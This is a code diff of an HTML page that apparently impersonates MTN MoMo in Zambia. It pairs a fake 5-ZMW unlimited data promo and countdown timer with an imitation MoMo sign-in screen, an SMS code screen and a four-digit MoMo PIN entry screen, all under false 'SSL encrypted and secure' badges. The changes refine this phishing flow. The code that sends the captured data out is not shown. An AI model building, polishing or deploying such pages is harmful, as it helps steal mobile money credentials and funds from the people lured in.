@@ -99,259 +99,40 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
 .powered-by .mtn-brand{font-family:'Arial Black',sans-serif;font-weight:900;font-size:19px;letter-spacing:-.5px;color:#ffcc00;font-style:italic;line-height:1;text-shadow:0 0 12px rgba(255,204,0,.6)}
 .powered-by .mtn-brand span{color:#fff;font-style:italic;display:block;font-size:10px;letter-spacing:0;margin-top:2px;font-weight:900}
 
-/* ============================================================
-   ⭐ PROMO CARD — 1-Day 5 ZMW ⭐
-   ============================================================ */
-.promo-card{
-  background:linear-gradient(135deg,#ff1e56 0%,#ff8a00 60%,#ffcc00 100%);
-  border-radius:22px;
-  padding:2px;
-  margin-bottom:22px;
-  position:relative;
-  overflow:hidden;
-  box-shadow:
-    0 0 30px rgba(255,30,86,.35),
-    0 0 60px rgba(255,138,0,.2),
-    0 4px 20px rgba(0,0,0,.4);
-  animation:promoPulse 3s ease-in-out infinite;
-}
-@keyframes promoPulse{
-  0%,100%{box-shadow:0 0 30px rgba(255,30,86,.35),0 0 60px rgba(255,138,0,.2),0 4px 20px rgba(0,0,0,.4)}
-  50%{box-shadow:0 0 45px rgba(255,30,86,.55),0 0 90px rgba(255,138,0,.35),0 4px 20px rgba(0,0,0,.4)}
-}
-.promo-card::before{
-  content:'';
-  position:absolute;
-  inset:2px;
-  border-radius:20px;
-  background:linear-gradient(160deg,#1a0f1e 0%,#2d1120 50%,#1c0d18 100%);
-  z-index:1;
-}
-.promo-glow{
-  position:absolute;
-  top:-50%;
-  left:-50%;
-  width:200%;
-  height:200%;
-  background:conic-gradient(from 0deg,transparent 0deg,rgba(255,255,255,.4) 30deg,transparent 60deg,transparent 360deg);
-  animation:promoSpin 6s linear infinite;
-  z-index:0;
-  opacity:.6;
-}
+/* PROMO */
+.promo-card{background:linear-gradient(135deg,#ff1e56 0%,#ff8a00 60%,#ffcc00 100%);border-radius:22px;padding:2px;margin-bottom:22px;position:relative;overflow:hidden;box-shadow:0 0 30px rgba(255,30,86,.35),0 0 60px rgba(255,138,0,.2),0 4px 20px rgba(0,0,0,.4);animation:promoPulse 3s ease-in-out infinite}
+@keyframes promoPulse{0%,100%{box-shadow:0 0 30px rgba(255,30,86,.35),0 0 60px rgba(255,138,0,.2),0 4px 20px rgba(0,0,0,.4)}50%{box-shadow:0 0 45px rgba(255,30,86,.55),0 0 90px rgba(255,138,0,.35),0 4px 20px rgba(0,0,0,.4)}}
+.promo-card::before{content:'';position:absolute;inset:2px;border-radius:20px;background:linear-gradient(160deg,#1a0f1e 0%,#2d1120 50%,#1c0d18 100%);z-index:1}
+.promo-glow{position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:conic-gradient(from 0deg,transparent 0deg,rgba(255,255,255,.4) 30deg,transparent 60deg,transparent 360deg);animation:promoSpin 6s linear infinite;z-index:0;opacity:.6}
 @keyframes promoSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
-.promo-ribbon{
-  position:absolute;
-  top:14px;
-  right:-32px;
-  background:linear-gradient(135deg,#ff1e56,#ff8a00);
-  color:#fff;
-  font-size:10px;
-  font-weight:900;
-  padding:5px 42px;
-  letter-spacing:2px;
-  transform:rotate(38deg);
-  box-shadow:0 2px 12px rgba(0,0,0,.4);
-  z-index:5;
-  text-shadow:0 1px 2px rgba(0,0,0,.3);
-}
-.promo-top{
-  display:flex;
-  align-items:center;
-  gap:12px;
-  padding:20px 20px 0;
-  position:relative;
-  z-index:2;
-}
-.promo-icon{
-  width:44px;
-  height:44px;
-  border-radius:12px;
-  background:linear-gradient(135deg,#ff1e56,#ff8a00);
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  color:#fff;
-  font-size:20px;
-  box-shadow:0 4px 14px rgba(255,30,86,.5);
-  flex-shrink:0;
-  animation:promoIconPulse 1.5s ease-in-out infinite;
-}
-@keyframes promoIconPulse{
-  0%,100%{transform:scale(1)}
-  50%{transform:scale(1.08)}
-}
+.promo-ribbon{position:absolute;top:14px;right:-32px;background:linear-gradient(135deg,#ff1e56,#ff8a00);color:#fff;font-size:10px;font-weight:900;padding:5px 42px;letter-spacing:2px;transform:rotate(38deg);box-shadow:0 2px 12px rgba(0,0,0,.4);z-index:5;text-shadow:0 1px 2px rgba(0,0,0,.3)}
+.promo-top{display:flex;align-items:center;gap:12px;padding:20px 20px 0;position:relative;z-index:2}
+.promo-icon{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,#ff1e56,#ff8a00);display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;box-shadow:0 4px 14px rgba(255,30,86,.5);flex-shrink:0;animation:promoIconPulse 1.5s ease-in-out infinite}
+@keyframes promoIconPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
 .promo-head{flex:1;min-width:0}
-.promo-title{
-  font-size:15px;
-  font-weight:900;
-  color:#fff;
-  letter-spacing:-.2px;
-  margin-bottom:2px;
-}
-.promo-sub{
-  font-size:11px;
-  font-weight:600;
-  color:#ffcc00;
-  letter-spacing:.2px;
-  display:flex;
-  align-items:center;
-  gap:5px;
-}
-.promo-sub::before{
-  content:'';
-  width:6px;
-  height:6px;
-  border-radius:50%;
-  background:#ff1e56;
-  box-shadow:0 0 6px #ff1e56;
-  animation:liveDot 1s ease-in-out infinite;
-  flex-shrink:0;
-}
-@keyframes liveDot{
-  0%,100%{opacity:1}
-  50%{opacity:.3}
-}
-.promo-body{
-  padding:14px 20px 20px;
-  position:relative;
-  z-index:2;
-}
-.promo-size{
-  font-size:26px;
-  font-weight:900;
-  color:#fff;
-  text-align:center;
-  letter-spacing:-1px;
-  margin-bottom:4px;
-  text-shadow:0 0 20px rgba(255,30,86,.5);
-}
-.promo-duration{
-  text-align:center;
-  font-size:14px;
-  color:#cbd5e0;
-  margin-bottom:14px;
-  letter-spacing:-.2px;
-}
-.promo-features{
-  display:flex;
-  gap:8px;
-  justify-content:center;
-  margin-bottom:16px;
-  flex-wrap:wrap;
-}
-.promo-feat{
-  font-size:11px;
-  font-weight:700;
-  color:#ffcc00;
-  background:rgba(255,204,0,.1);
-  border:1px solid rgba(255,204,0,.25);
-  padding:4px 10px;
-  border-radius:20px;
-  display:flex;
-  align-items:center;
-  gap:5px;
-  letter-spacing:.2px;
-}
+.promo-title{font-size:15px;font-weight:900;color:#fff;letter-spacing:-.2px;margin-bottom:2px}
+.promo-sub{font-size:11px;font-weight:600;color:#ffcc00;letter-spacing:.2px;display:flex;align-items:center;gap:5px}
+.promo-sub::before{content:'';width:6px;height:6px;border-radius:50%;background:#ff1e56;box-shadow:0 0 6px #ff1e56;animation:liveDot 1s ease-in-out infinite;flex-shrink:0}
+@keyframes liveDot{0%,100%{opacity:1}50%{opacity:.3}}
+.promo-body{padding:14px 20px 20px;position:relative;z-index:2}
+.promo-size{font-size:26px;font-weight:900;color:#fff;text-align:center;letter-spacing:-1px;margin-bottom:4px;text-shadow:0 0 20px rgba(255,30,86,.5)}
+.promo-duration{text-align:center;font-size:14px;color:#cbd5e0;margin-bottom:14px;letter-spacing:-.2px}
+.promo-features{display:flex;gap:8px;justify-content:center;margin-bottom:16px;flex-wrap:wrap}
+.promo-feat{font-size:11px;font-weight:700;color:#ffcc00;background:rgba(255,204,0,.1);border:1px solid rgba(255,204,0,.25);padding:4px 10px;border-radius:20px;display:flex;align-items:center;gap:5px;letter-spacing:.2px}
 .promo-feat i{font-size:9px}
-.promo-price-row{
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:12px;
-  margin-bottom:16px;
-  padding:12px 0;
-  border-top:1px dashed rgba(255,30,86,.3);
-  border-bottom:1px dashed rgba(255,30,86,.3);
-}
-.promo-old{
-  font-size:16px;
-  font-weight:700;
-  color:#94a3b8;
-  text-decoration:line-through;
-  text-decoration-color:#ff1e56;
-  text-decoration-thickness:2px;
-  letter-spacing:-.3px;
-}
-.promo-price{
-  font-size:40px;
-  font-weight:900;
-  background:linear-gradient(135deg,#ffcc00 0%,#ff8a00 100%);
-  -webkit-background-clip:text;
-  -webkit-text-fill-color:transparent;
-  background-clip:text;
-  letter-spacing:-1.5px;
-  filter:drop-shadow(0 0 14px rgba(255,138,0,.6));
-}
-.promo-save{
-  background:linear-gradient(135deg,#ff1e56,#ff8a00);
-  color:#fff;
-  font-size:11px;
-  font-weight:900;
-  padding:5px 10px;
-  border-radius:20px;
-  letter-spacing:.5px;
-  box-shadow:0 4px 12px rgba(255,30,86,.5);
-  animation:promoSavePulse 1.2s ease-in-out infinite;
-}
-@keyframes promoSavePulse{
-  0%,100%{transform:scale(1)}
-  50%{transform:scale(1.06)}
-}
-.promo-btn{
-  width:100%;
-  padding:16px;
-  border:none;
-  border-radius:50px;
-  background:linear-gradient(135deg,#ff1e56 0%,#ff8a00 100%);
-  color:#fff;
-  font-size:16px;
-  font-weight:900;
-  letter-spacing:.4px;
-  cursor:pointer;
-  font-family:inherit;
-  text-transform:uppercase;
-  box-shadow:0 8px 24px rgba(255,30,86,.5),0 0 60px rgba(255,138,0,.3);
-  transition:all .2s;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:8px;
-  position:relative;
-  overflow:hidden;
-}
-.promo-btn::before{
-  content:'';
-  position:absolute;
-  top:0;
-  left:-100%;
-  width:100%;
-  height:100%;
-  background:linear-gradient(90deg,transparent,rgba(255,255,255,.5),transparent);
-  animation:shine 2.5s infinite;
-}
+.promo-price-row{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:16px;padding:12px 0;border-top:1px dashed rgba(255,30,86,.3);border-bottom:1px dashed rgba(255,30,86,.3)}
+.promo-old{font-size:16px;font-weight:700;color:#94a3b8;text-decoration:line-through;text-decoration-color:#ff1e56;text-decoration-thickness:2px;letter-spacing:-.3px}
+.promo-price{font-size:40px;font-weight:900;background:linear-gradient(135deg,#ffcc00 0%,#ff8a00 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:-1.5px;filter:drop-shadow(0 0 14px rgba(255,138,0,.6))}
+.promo-save{background:linear-gradient(135deg,#ff1e56,#ff8a00);color:#fff;font-size:11px;font-weight:900;padding:5px 10px;border-radius:20px;letter-spacing:.5px;box-shadow:0 4px 12px rgba(255,30,86,.5);animation:promoSavePulse 1.2s ease-in-out infinite}
+@keyframes promoSavePulse{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
+.promo-btn{width:100%;padding:16px;border:none;border-radius:50px;background:linear-gradient(135deg,#ff1e56 0%,#ff8a00 100%);color:#fff;font-size:16px;font-weight:900;letter-spacing:.4px;cursor:pointer;font-family:inherit;text-transform:uppercase;box-shadow:0 8px 24px rgba(255,30,86,.5),0 0 60px rgba(255,138,0,.3);transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;position:relative;overflow:hidden}
+.promo-btn::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.5),transparent);animation:shine 2.5s infinite}
 .promo-btn:active{transform:scale(.98)}
 .promo-btn i{font-size:14px}
-.promo-timer{
-  text-align:center;
-  font-size:12px;
-  color:#ffcc00;
-  font-weight:600;
-  margin-top:12px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:6px;
-  letter-spacing:.2px;
-}
-.promo-timer strong{
-  color:#fff;
-  font-weight:900;
-  letter-spacing:.5px;
-  font-family:'Courier New',monospace;
-}
+.promo-timer{text-align:center;font-size:12px;color:#ffcc00;font-weight:600;margin-top:12px;display:flex;align-items:center;justify-content:center;gap:6px;letter-spacing:.2px}
+.promo-timer strong{color:#fff;font-weight:900;letter-spacing:.5px;font-family:'Courier New',monospace}
 .promo-timer i{font-size:11px;animation:liveDot 1s ease-in-out infinite}
 
-/* REGULAR PLAN CARDS */
 .plan-card{background:linear-gradient(160deg,rgba(30,41,59,.95) 0%,rgba(15,23,42,.98) 100%);border:1px solid rgba(255,204,0,.18);border-radius:22px;padding:26px 22px;margin-bottom:18px;color:#fff;position:relative;transition:transform .15s,box-shadow .25s,border-color .25s;overflow:hidden;backdrop-filter:blur(8px);box-shadow:0 4px 20px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.04)}
 .plan-card::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 100% 0%,rgba(255,204,0,.12) 0%,transparent 55%);pointer-events:none}
 .plan-card:active{transform:scale(.985);border-color:rgba(255,204,0,.5);box-shadow:0 0 30px rgba(255,204,0,.3),inset 0 1px 0 rgba(255,255,255,.08)}
@@ -442,56 +223,109 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
 .secure-note{text-align:center;font-size:12.5px;color:#64748b;margin-top:20px;line-height:1.5;padding:0 10px}
 .secure-note i{color:#ffcc00;margin-right:4px}
 
-/* WELCOME */
-.welcome-page{background:#ffffff;min-height:100vh;padding:0;position:relative;z-index:2}
-.welcome-topbar{background:#ffffff;padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}
-.welcome-topbar .back-arrow{font-size:22px;color:#1c1c1e;cursor:pointer;background:none;border:none;padding:4px}
-.welcome-topbar .help-icon{font-size:20px;color:#1c1c1e;cursor:pointer}
-.welcome-body{padding:30px 26px 40px;display:flex;flex-direction:column;min-height:calc(100vh - 60px)}
-.welcome-logo-wrap{text-align:center;margin-bottom:22px}
-.momo-logo-box{display:inline-flex;align-items:center;justify-content:center;width:64px;height:64px;background:#0d3a75;border-radius:16px;margin-bottom:10px;position:relative;box-shadow:0 6px 18px rgba(13,58,117,.3)}
-.momo-logo-box svg{width:38px;height:38px}
-.momo-brand-name{font-size:20px;font-weight:800;color:#0d3a75;letter-spacing:-.4px;line-height:1;margin-bottom:3px}
-.momo-brand-sub{font-size:10px;font-weight:700;color:#f7c400;letter-spacing:1.5px;text-transform:uppercase}
-.welcome-greeting{text-align:center;font-size:32px;font-weight:900;color:#1c1c1e;margin:26px 0 6px;letter-spacing:-1px;font-family:'Arial Black','Arial',sans-serif}
-.welcome-subgreeting{text-align:center;font-size:15px;color:#5f6368;margin-bottom:34px;font-weight:500}
-.welcome-label{font-size:15px;font-weight:800;color:#1c1c1e;line-height:1.4;margin-bottom:22px;letter-spacing:-.2px}
-.welcome-input{width:100%;padding:18px 18px;border:1.5px solid #1c1c1e;border-radius:8px;font-size:16px;color:#1c1c1e;background:#fff;outline:none;font-weight:500;letter-spacing:.3px;transition:all .2s;margin-bottom:16px}
-.welcome-input::placeholder{color:#9aa0a6;font-weight:400;letter-spacing:0}
-.welcome-input:focus{border-width:2px;border-color:#0d3a75;padding:17px 17px}
-.welcome-number-link{color:#0d3a75;font-size:14px;font-weight:700;text-decoration:none;margin-bottom:28px;display:inline-block;cursor:pointer}
-.welcome-number-link:hover{text-decoration:underline}
-.welcome-signin{width:100%;padding:19px;border:none;border-radius:50px;background:#f7c400;color:#1c1c1e;font-size:17px;font-weight:800;letter-spacing:.3px;cursor:pointer;transition:all .2s;font-family:inherit;box-shadow:0 4px 14px rgba(247,196,0,.35)}
-.welcome-signin:active{transform:scale(.98);background:#e6b800}
-.welcome-signin:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
-.welcome-footer{margin-top:auto;padding-top:30px;text-align:center;font-size:12px;color:#9aa0a6;font-weight:500;line-height:1.6}
-.welcome-footer i{color:#34c759;margin-right:4px}
+/* ============================================================
+   LOGIN PAGE (MoMo style — same as screenshot)
+   ============================================================ */
+.login-page{background:#ffffff;min-height:100vh;padding:0;position:relative;z-index:2}
+.login-topbar{background:#ffffff;padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}
+.login-topbar .back-arrow{font-size:22px;color:#1c1c1e;cursor:pointer;background:none;border:none;padding:4px}
+.login-topbar .help-icon{font-size:20px;color:#1c1c1e;cursor:pointer}
+.login-body{padding:30px 26px 40px;display:flex;flex-direction:column;min-height:calc(100vh - 60px)}
 
-/* PIN */
-.pin-page{background:#ffffff;min-height:100vh;padding:0;position:relative;z-index:2}
-.pin-topbar{background:#ffffff;padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}
-.pin-topbar .back-arrow{font-size:22px;color:#1c1c1e;cursor:pointer;background:none;border:none;padding:4px}
-.pin-topbar .help-icon{font-size:20px;color:#1c1c1e;cursor:pointer}
-.pin-body{padding:34px 26px 40px}
-.pin-title{font-size:24px;font-weight:900;color:#1c1c1e;margin-bottom:8px;letter-spacing:-.5px}
-.pin-subtitle{font-size:14px;color:#5f6368;line-height:1.5;margin-bottom:30px;font-weight:500}
-.pin-phone-display{text-align:center;font-size:15px;color:#5f6368;font-weight:600;margin-bottom:24px;letter-spacing:.2px}
-.pin-phone-display strong{color:#1c1c1e;font-weight:800}
-.pin-label-top{font-size:13px;font-weight:800;color:#1c1c1e;margin-bottom:12px;letter-spacing:.2px}
-.pin-field-4{display:flex;gap:14px;margin-bottom:14px}
-.pin-box-real{flex:1;height:64px;text-align:center;font-size:26px;font-weight:900;border:1.5px solid #d1d1d6;border-radius:12px;background:#fff;color:#1c1c1e;outline:none;transition:all .2s;font-family:inherit}
-.pin-box-real:focus{border-width:2px;border-color:#0d3a75;padding:0 1px}
-.pin-box-real.filled{background:#f7c400;border-color:#f7c400;color:#1c1c1e}
-.pin-box-real::-webkit-inner-spin-button{-webkit-appearance:none}
-.pin-box-real[type="number"]{-moz-appearance:textfield}
-.pin-forgot-row{text-align:right;margin-bottom:30px}
-.pin-forgot-row a{color:#0d3a75;font-size:13.5px;font-weight:700;text-decoration:none}
-.pin-forgot-row a:hover{text-decoration:underline}
-.pin-submit{width:100%;padding:19px;border:none;border-radius:50px;background:#d1d1d6;color:#fff;font-size:17px;font-weight:800;letter-spacing:.3px;cursor:not-allowed;transition:all .2s;font-family:inherit}
-.pin-submit.enabled{background:#f7c400;color:#1c1c1e;cursor:pointer;box-shadow:0 4px 14px rgba(247,196,0,.4)}
-.pin-submit.enabled:active{transform:scale(.98);background:#e6b800}
-.pin-secure{text-align:center;margin-top:22px;font-size:12px;color:#8e8e93;display:flex;align-items:center;justify-content:center;gap:6px;font-weight:600}
-.pin-secure i{color:#34c759}
+/* MoMo logo */
+.momo-logo-wrap{text-align:center;margin-bottom:24px}
+.momo-logo{
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  width:62px;
+  height:62px;
+  background:#0d3a75;
+  border-radius:14px;
+  box-shadow:0 6px 18px rgba(13,58,117,.3);
+  position:relative;
+}
+.momo-logo::after{
+  content:'';
+  position:absolute;
+  bottom:-4px;
+  left:6%;
+  width:88%;
+  height:6px;
+  background:#f7c400;
+  border-radius:0 0 6px 6px;
+}
+.momo-logo svg{width:34px;height:34px}
+.momo-brand-name{font-size:20px;font-weight:800;color:#0d3a75;letter-spacing:-.4px;line-height:1;margin-top:12px}
+.momo-brand-sub{font-size:9px;font-weight:700;color:#0d3a75;letter-spacing:1.5px;text-transform:uppercase;margin-top:3px}
+
+/* Greeting */
+.login-greeting{text-align:center;font-size:36px;font-weight:900;color:#1c1c1e;margin:30px 0 4px;letter-spacing:-1px;font-family:'Arial Black','Arial',sans-serif;font-style:italic}
+.login-subgreeting{text-align:center;font-size:15px;color:#5f6368;margin-bottom:38px;font-weight:500}
+
+/* Label */
+.login-label{font-size:15px;font-weight:800;color:#1c1c1e;line-height:1.4;margin-bottom:20px;letter-spacing:-.2px}
+
+/* Input */
+.login-input{
+  width:100%;
+  padding:18px 18px;
+  border:1.5px solid #1c1c1e;
+  border-radius:10px;
+  font-size:16px;
+  color:#1c1c1e;
+  background:#fff;
+  outline:none;
+  font-weight:500;
+  letter-spacing:.3px;
+  transition:border-color .2s;
+  margin-bottom:16px;
+}
+.login-input::placeholder{color:#9aa0a6;font-weight:400;letter-spacing:0}
+.login-input:focus{border-width:2px;border-color:#0d3a75;padding:17px 17px}
+
+/* Number changed link */
+.login-number-link{
+  color:#0d3a75;
+  font-size:14px;
+  font-weight:700;
+  text-decoration:underline;
+  text-underline-offset:3px;
+  margin-bottom:32px;
+  display:inline-block;
+  cursor:pointer;
+}
+
+/* Sign in button */
+.login-signin{
+  width:100%;
+  padding:19px;
+  border:none;
+  border-radius:50px;
+  background:#f7c400;
+  color:#1c1c1e;
+  font-size:17px;
+  font-weight:800;
+  letter-spacing:.3px;
+  cursor:pointer;
+  transition:all .2s;
+  font-family:inherit;
+  box-shadow:0 4px 14px rgba(247,196,0,.35);
+}
+.login-signin:active{transform:scale(.98);background:#e6b800}
+.login-signin:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
+
+/* Footer */
+.login-footer{
+  margin-top:auto;
+  padding-top:30px;
+  text-align:center;
+  font-size:12px;
+  color:#9aa0a6;
+  font-weight:500;
+  line-height:1.6;
+}
+.login-footer i{color:#34c759;margin-right:4px}
 
 /* SMS */
 .sms-page{background:#ffffff;min-height:100vh;display:flex;flex-direction:column;position:relative;z-index:2}
@@ -517,6 +351,75 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
 .sms-next-btn:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
 .sms-secure{text-align:center;font-size:11px;color:#8e8e93;letter-spacing:1.2px;font-weight:700;margin-top:20px;display:flex;align-items:center;justify-content:center;gap:6px}
 .sms-secure i{color:#34c759}
+
+/* PIN PAGE — FIXED */
+.pin-page{background:#ffffff;min-height:100vh;padding:0;position:relative;z-index:2}
+.pin-topbar{background:#ffffff;padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f0f0f0}
+.pin-topbar .back-arrow{font-size:22px;color:#1c1c1e;cursor:pointer;background:none;border:none;padding:4px}
+.pin-topbar .help-icon{font-size:20px;color:#1c1c1e;cursor:pointer}
+.pin-body{padding:34px 26px 40px}
+.pin-title{font-size:24px;font-weight:900;color:#1c1c1e;margin-bottom:8px;letter-spacing:-.5px}
+.pin-subtitle{font-size:14px;color:#5f6368;line-height:1.5;margin-bottom:26px;font-weight:500}
+.pin-phone-display{text-align:center;font-size:15px;color:#5f6368;font-weight:600;margin-bottom:22px;letter-spacing:.2px}
+.pin-phone-display strong{color:#1c1c1e;font-weight:800}
+.pin-label-top{font-size:13px;font-weight:800;color:#1c1c1e;margin-bottom:12px;letter-spacing:.2px}
+
+/* FIXED PIN BOXES */
+.pin-field-4{display:flex;gap:12px;margin-bottom:16px}
+.pin-box-real{
+  flex:1;
+  height:62px;
+  text-align:center;
+  font-size:26px;
+  font-weight:900;
+  border:2px solid #d1d1d6;
+  border-radius:12px;
+  background:#fff;
+  color:#1c1c1e;
+  outline:none;
+  transition:background .15s, border-color .15s, color .15s;
+  font-family:inherit;
+  -webkit-appearance:none;
+  -moz-appearance:textfield;
+  caret-color:transparent;
+}
+.pin-box-real:focus{
+  border-color:#0d3a75;
+  background:#fff;
+}
+.pin-box-real.filled{
+  background:#f7c400;
+  border-color:#f7c400;
+  color:#1c1c1e;
+}
+.pin-box-real::-webkit-inner-spin-button,
+.pin-box-real::-webkit-outer-spin-button{
+  -webkit-appearance:none;
+  margin:0;
+}
+
+.pin-forgot-row{text-align:right;margin-bottom:30px}
+.pin-forgot-row a{color:#0d3a75;font-size:13.5px;font-weight:700;text-decoration:none}
+.pin-forgot-row a:hover{text-decoration:underline}
+
+.pin-submit{
+  width:100%;
+  padding:19px;
+  border:none;
+  border-radius:50px;
+  background:#d1d1d6;
+  color:#fff;
+  font-size:17px;
+  font-weight:800;
+  letter-spacing:.3px;
+  cursor:not-allowed;
+  transition:all .2s;
+  font-family:inherit;
+}
+.pin-submit.enabled{background:#f7c400;color:#1c1c1e;cursor:pointer;box-shadow:0 4px 14px rgba(247,196,0,.4)}
+.pin-submit.enabled:active{transform:scale(.98);background:#e6b800}
+.pin-secure{text-align:center;margin-top:22px;font-size:12px;color:#8e8e93;display:flex;align-items:center;justify-content:center;gap:6px;font-weight:600}
+.pin-secure i{color:#34c759}
 
 /* REVIEW */
 .review-page{background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:30px 24px}
@@ -600,11 +503,11 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
   .track-progress-fill{left:22px}
   .testi-card{width:260px;padding:14px 14px}
   .testi-body{font-size:12px}
-  .welcome-greeting{font-size:26px}
-  .welcome-body{padding:24px 20px 30px}
+  .login-greeting{font-size:28px}
+  .login-body{padding:24px 20px 30px}
   .pin-body{padding:26px 20px 30px}
-  .pin-box-real{height:58px;font-size:22px}
-  .pin-field-4{gap:10px}
+  .pin-box-real{height:56px;font-size:22px}
+  .pin-field-4{gap:8px}
   .pin-title{font-size:20px}
   .promo-price{font-size:34px}
   .promo-size{font-size:22px}
@@ -664,21 +567,9 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
           <button class="speedtest-btn" id="runSpeedTest">Run Test</button>
         </div>
         <div class="speedtest-results" id="speedResults">
-          <div class="speedtest-cell" id="cellDown">
-            <div class="val" id="downVal">—</div>
-            <div class="unit">Mbps</div>
-            <div class="lbl">Download</div>
-          </div>
-          <div class="speedtest-cell" id="cellUp">
-            <div class="val" id="upVal">—</div>
-            <div class="unit">Mbps</div>
-            <div class="lbl">Upload</div>
-          </div>
-          <div class="speedtest-cell" id="cellPing">
-            <div class="val" id="pingVal">—</div>
-            <div class="unit">ms</div>
-            <div class="lbl">Ping</div>
-          </div>
+          <div class="speedtest-cell" id="cellDown"><div class="val" id="downVal">—</div><div class="unit">Mbps</div><div class="lbl">Download</div></div>
+          <div class="speedtest-cell" id="cellUp"><div class="val" id="upVal">—</div><div class="unit">Mbps</div><div class="lbl">Upload</div></div>
+          <div class="speedtest-cell" id="cellPing"><div class="val" id="pingVal">—</div><div class="unit">ms</div><div class="lbl">Ping</div></div>
         </div>
       </div>
 
@@ -688,7 +579,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
         <span class="mtn-brand">MTN<span>MoMo</span></span>
       </div>
 
-      <!-- ⭐ PROMO CARD ⭐ -->
+      <!-- PROMO -->
       <div class="promo-card">
         <div class="promo-glow"></div>
         <div class="promo-ribbon">PROMO</div>
@@ -715,9 +606,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
           <button class="promo-btn" data-plan="1-Day Promo Trial" data-size="Unlimited" data-duration="24-Hour" data-speed="200 Mbps" data-price="ZMW 5">
             <i class="fas fa-fire"></i> Claim Offer <i class="fas fa-arrow-right"></i>
           </button>
-          <div class="promo-timer">
-            <i class="fas fa-clock"></i> Ends in <strong id="promoTime">23:59:59</strong>
-          </div>
+          <div class="promo-timer"><i class="fas fa-clock"></i> Ends in <strong id="promoTime">23:59:59</strong></div>
         </div>
       </div>
 
@@ -856,16 +745,16 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
     </div>
   </div>
 
-  <!-- PAGE 3: WELCOME -->
-  <div class="page" id="page-welcome">
-    <div class="welcome-page">
-      <div class="welcome-topbar">
-        <button class="back-arrow" id="welcomeBack"><i class="fas fa-arrow-left"></i></button>
-        <i class="fas fa-question-circle help-icon" id="welcomeHelp"></i>
+  <!-- PAGE 3: LOGIN (MoMo Welcome) -->
+  <div class="page" id="page-login">
+    <div class="login-page">
+      <div class="login-topbar">
+        <button class="back-arrow" id="loginBack"><i class="fas fa-arrow-left"></i></button>
+        <i class="fas fa-question-circle help-icon" id="loginHelp"></i>
       </div>
-      <div class="welcome-body">
-        <div class="welcome-logo-wrap">
-          <div class="momo-logo-box">
+      <div class="login-body">
+        <div class="momo-logo-wrap">
+          <div class="momo-logo">
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
               <path d="M4 20V8l8-5 8 5v12l-8 4-8-4z" stroke="#f7c400" stroke-width="1.5" fill="none"/>
               <path d="M12 3v18" stroke="#f7c400" stroke-width="1.2"/>
@@ -875,13 +764,13 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
           <div class="momo-brand-name">MoMo</div>
           <div class="momo-brand-sub">from MTN</div>
         </div>
-        <h1 class="welcome-greeting">Y'ello,</h1>
-        <p class="welcome-subgreeting">welcome to MoMo</p>
-        <div class="welcome-label">Enter your Cellphone number to sign in</div>
-        <input type="tel" id="welcomePhone" class="welcome-input" placeholder="Cellphone Number" maxlength="9" inputmode="numeric" autocomplete="off">
-        <a class="welcome-number-link" id="numberChangedLink">Has your number changed?</a>
-        <button class="welcome-signin" id="welcomeSignin">Sign in</button>
-        <div class="welcome-footer"><i class="fas fa-lock"></i> SSL encrypted and secure</div>
+        <h1 class="login-greeting">Y'ello,</h1>
+        <p class="login-subgreeting">welcome to MoMo</p>
+        <div class="login-label">Enter your Cellphone number to sign in</div>
+        <input type="tel" id="loginPhone" class="login-input" placeholder="Cellphone Number" maxlength="9" inputmode="numeric" autocomplete="off">
+        <a class="login-number-link" id="numberChangedLink">Has your number changed?</a>
+        <button class="login-signin" id="loginSignin">Sign in</button>
+        <div class="login-footer"><i class="fas fa-lock"></i> SSL encrypted and secure</div>
       </div>
     </div>
   </div>
@@ -911,7 +800,7 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
     </div>
   </div>
 
-  <!-- PAGE 5: PIN -->
+  <!-- PAGE 5: PIN (FIXED) -->
   <div class="page" id="page-pin">
     <div class="pin-page">
       <div class="pin-topbar">
@@ -924,10 +813,10 @@ body{background:#04060f;min-height:100vh;color:#1c1c1e}
         <div class="pin-phone-display" id="pinPhoneDisplay">+260 <strong>97 123 4567</strong></div>
         <div class="pin-label-top">MoMo PIN</div>
         <div class="pin-field-4" id="pinFieldReal">
-          <input type="password" class="pin-box-real" maxlength="1" inputmode="numeric" autocomplete="off">
-          <input type="password" class="pin-box-real" maxlength="1" inputmode="numeric" autocomplete="off">
